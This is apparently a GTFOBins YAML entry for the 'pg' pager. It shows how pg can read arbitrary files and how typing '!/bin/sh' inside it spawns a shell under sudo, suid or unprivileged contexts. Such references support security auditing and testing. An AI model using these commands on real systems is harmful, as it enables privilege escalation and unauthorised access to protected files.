<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/pg -->
---
functions:
  file-read:
  - code: |-
      pg /path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      pg /etc/hosts
      !/bin/sh
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
